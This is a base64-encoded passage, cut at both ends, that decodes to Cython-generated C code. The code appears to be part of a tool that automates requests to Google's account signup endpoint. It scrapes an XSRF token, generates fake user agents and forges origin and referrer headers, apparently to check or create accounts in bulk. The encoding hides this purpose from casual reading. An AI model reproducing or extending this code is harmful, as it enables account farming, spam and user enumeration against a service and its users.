3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX3B5eF92X3JlczEgPSBfX3B5eF90XzQ7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEzNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEzNywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzksIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgICAgICBfX3B5eF90XzYgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpOwogICAgICAgIGFzc2VydChfX3B5eF90XzYpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9kYXRhX2luaXRpYWxfc2V0dXBfZGF0YV9udWxsX251bCwgX19weXhfdF81fTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEzNywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdl9tYXRjaCA9IF9fcHl4X3RfNDsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfbWF0Y2gpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTAgPCAwKSkpIF9fUFlYX0VSUigwLCAxNDEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAobGlrZWx5KF9fcHl4X3RfMTApKSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3ZfbWF0Y2g7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19weXhfdF85ID0gMDsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMn07CiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JvdXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTQyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIH0KICAgICAgICBfX3B5eF92X3RvayA9IF9fcHl4X3RfNDsKICAgICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgICAKICAgICAgICBnb3RvIF9fcHl4X0w5OwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX3B5eF90XzcgPSBOVUxMOwogICAgICAgIF9fUHl4X0lOQ1JFRigoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKTsKICAgICAgICBfX3B5eF90XzUgPSAoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSk7IAogICAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ub2tlbl9idWx1bmFtYWR9OwogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X1JhaXNlKF9fcHl4X3RfNCwgMCwgMCwgMCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgX19QWVhfRVJSKDAsIDE0NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfTDk6OwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTQ1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19weXhfdl9jb29raWVzID0gKChQeU9iamVjdCopX19weXhfdF80KTsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoOCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE0NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE0NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXV0aG9yaXR5X2hlYWRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE0NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2dsZV9hY2NvdW50c19kb21haW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNywgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjY2VwdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTUwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb250ZW50X3R5cGVfaGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTUwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29udGVudF90eXBlX2Zvcm1fYWx0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTUwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF90XzcsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW5faGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTUyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ29vZ2xlX2FjY291bnRzX3VybCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdF83LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcnJlcl9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgICAgIAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzgpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOCk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF84LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE1NSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIH0KICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdF82LCBfX3B5eF90XzcpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQ3LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X2hlYWRlcnMyID0gKChQeU9iamVjdCopX19weXhfdF80KTsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90b2ssIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoX19weXhfdl9uMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzEyWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOTsKICAgICAgX19weXhfdF8xMlsxXSA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF8xMlsyXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEwOwogICAgICBfX3B5eF90XzEyWzNdID0gX19weXhfdF82OwogICAgICBfX3B5eF90XzEyWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTA7CiAgICAgIF9fcHl4X3RfMTJbNV0gPSBfX3B5eF90Xzg7CiAgICAgIF9fcHl4X3RfMTJbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMDsKICAgICAgX19weXhfdF8xMls3XSA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF8xMls4XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEwOwogICAgICBfX3B5eF90XzEyWzldID0gX19weXhfdF8xMTsKICAgICAgX19weXhfdF8xMlsxMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBfMF9udWxsX251bGxfd2ViX2dsaWZfc2lnbnVwXzA7CiAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzEyLCAxMSwgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNykgKyAzICogNCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgNDgsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzUpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTEpKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYW